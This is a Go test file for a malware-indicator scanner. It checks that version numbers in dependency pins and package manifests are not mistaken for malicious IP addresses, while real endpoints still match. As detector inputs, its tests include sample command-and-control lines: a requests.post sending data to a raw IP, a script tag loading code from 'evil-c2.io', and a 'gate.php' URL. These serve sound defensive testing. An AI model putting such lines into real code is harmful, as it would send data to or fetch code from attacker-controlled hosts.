package iocscan

import "testing"

// A four-segment version is ordinary in Python, .NET and Java packaging, and
// allow.VersionLikeIP cannot reject it: that rule requires every octet <= 31, so
// 4.13.0.92 and 4.10.0.82 pass as addresses and get looked up as network endpoints.
//
// Measured on production 2026-08-08: IOC-STIX-MATCH was the SOLE evidence for 2,173 of
// pypi's 8,058 malware mints. Sampled matches included the line
// `"opencv-python>=4.13.0.92",` from a setup.py install_requires list, recorded as
// "Malicious IP address 4.10.0.82". A version pin is not a connection.
func TestIPv4InVersionConstraint(t *testing.T) {
	versions := map[string]string{
		// Verbatim production shape.
		`  "opencv-python>=4.13.0.92",`: "4.13.0.92",
		`torch==2.10.0.41`:              "2.10.0.41",
		`numpy ~= 4.10.0.82`:            "4.10.0.82",
		`"pkg": "^1.2.3.4"`:             "1.2.3.4",
		`serde = "~1.2.3.4"`:            "1.2.3.4",
		`requires >1.2.3.4`:             "1.2.3.4",
		`before <1.2.3.4`:               "1.2.3.4",
		`pinned to v4.10.0.82`:          "4.10.0.82",
		`Version V1.2.3.4`:              "1.2.3.4",
		`!=1.2.3.4`:                     "1.2.3.4",
	}
	for s, quad := range versions {
		if !ipv4InVersionConstraint(s, atQuad(t, s, quad)) {
			t.Errorf("ipv4InVersionConstraint(%q) = false, want true", s)
		}
	}

	// Anything a real C2 could inhabit must still be matchable. Plain assignment is
	// the important one: `=` alone is how configuration names a host.
	addresses := map[string]string{
		`SERVER=1.2.3.4`:          "1.2.3.4",
		`host: 1.2.3.4`:           "1.2.3.4",
		`http://1.2.3.4/gate.php`: "1.2.3.4",
		`connect 1.2.3.4 now`:     "1.2.3.4",
		`"c2": "1.2.3.4"`:         "1.2.3.4",
		`rev4.10.0.82`:            "4.10.0.82", // the v is part of a word
		`REMOTE_ADDR=1.2.3.4`:     "1.2.3.4",
	}
	for s, quad := range addresses {
		if ipv4InVersionConstraint(s, atQuad(t, s, quad)) {
			t.Errorf("ipv4InVersionConstraint(%q) = true, want false — a real address was dropped", s)
		}
	}
}

// End-to-end through the matcher: a feed carrying the version-shaped quad as an
// indicator must not match it in a requirements line, but must still match it when the
// same value appears as an actual endpoint.
func TestVersionConstraintNotMatchedByFeed(t *testing.T) {
	set := NewIndicatorSet()
	set.Add(&Indicator{Type: TypeIPv4, Value: "4.13.0.92"})
	m := &Matcher{set: set}

	if got := m.matchLine(`  "opencv-python>=4.13.0.92",`, false); len(got) != 0 {
		t.Errorf("matched a version pin as an IP indicator: %+v", got)
	}
	if got := m.matchLine(`requests.post("http://4.13.0.92/x", data=d)`, false); len(got) == 0 {
		t.Error("stopped matching the same value used as a real endpoint")
	}
}

// The attribute and key forms of a version field, from NuGet, Maven and JSON manifests.
// The first three are verbatim production lines from nuget mints.
func TestIPv4InVersionField(t *testing.T) {
	versions := map[string]string{
		`<dependency id="Tenuto" version="1.0.0.39" exclude="Build,Analyzers" />`:        "1.0.0.39",
		`<dependency id="AWSSDK.Extensions.CborProtocol" version="[4.0.0.53, 5.0.0)" />`: "4.0.0.53",
		`<PackageReference Include="Foo" Version="11.5.55.0" />`:                         "11.5.55.0",
		`<version>2.8.52.0</version>`:                                                    "2.8.52.0",
		`  "version": "4.13.0.92",`:                                                      "4.13.0.92",
		`version: 1.3.101.113`:                                                           "1.3.101.113",
	}
	for s, quad := range versions {
		if !ipv4InVersionField(s, atQuad(t, s, quad)) {
			t.Errorf("ipv4InVersionField(%q) = false, want true", s)
		}
	}
	// Anything that names an endpoint must still be matchable, including a key that merely
	// CONTAINS the word: `version_server` is not `version`.
	addresses := map[string]string{
		`SERVER=1.2.3.4`:                      "1.2.3.4",
		`host: 1.2.3.4`:                       "1.2.3.4",
		`"c2": "1.2.3.4"`:                     "1.2.3.4",
		`http://1.2.3.4/gate.php`:             "1.2.3.4",
		`version_server = "1.2.3.4"`:          "1.2.3.4",
		`<endpoint>1.2.3.4</endpoint>`:        "1.2.3.4",
		`<dependency id="x" url="1.2.3.4" />`: "1.2.3.4",
		`REMOTE_ADDR=1.2.3.4`:                 "1.2.3.4",
		`connect 1.2.3.4 now`:                 "1.2.3.4",
	}
	for s, quad := range addresses {
		if ipv4InVersionField(s, atQuad(t, s, quad)) {
			t.Errorf("ipv4InVersionField(%q) = true, want false — a real address was dropped", s)
		}
	}
}

// Version fields from withdrawn GCVE malware audit records (2026-10-26): composer's
// installed.php array arrow, a Debian epoch, and camel-cased version keys.
func TestAuditVersionFieldsAreNotAddresses(t *testing.T) {
	m := auditMatcher("1.33.0.0", "1.7.0.95", "15.63.0.10", "1.103.1.0", "update.zip", "libc.so")
	for _, line := range []string{
		`'version' => '1.33.0.0',`,
		`NewVersion: "1:1.7.0.95",`,
		`VersionName: "15.63.0.10",`,
		`AppVersion:     "1.103.1.0",`,
		`update = "/sdcard/update.zip"`,
		`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")`,
		`return ctypes.CDLL("libc.so.6")`,
	} {
		if ev := m.MatchText("pkg/src/main.go", line); len(ev) != 0 {
			t.Errorf("version or file name matched as an indicator: %s", line)
		}
	}
}

// An endpoint assigned to a key that merely mentions versions, a PHP host map entry, and a
// protocol-relative script URL still match.
func TestAuditVersionFieldRuleKeepsEndpoints(t *testing.T) {
	m := auditMatcher("45.137.21.9", "evil-c2.io")
	for _, line := range []string{
		`versionCheckHost: "45.137.21.9",`,
		`'host' => '45.137.21.9',`,
		`SERVER=45.137.21.9`,
		`<script src="//evil-c2.io/x.js"></script>`,
	} {
		if got := evidenceLines(m.MatchText("pkg/src/index.js", line)); len(got) != 1 {
			t.Errorf("endpoint lost its evidence: %s", line)
		}
	}
}
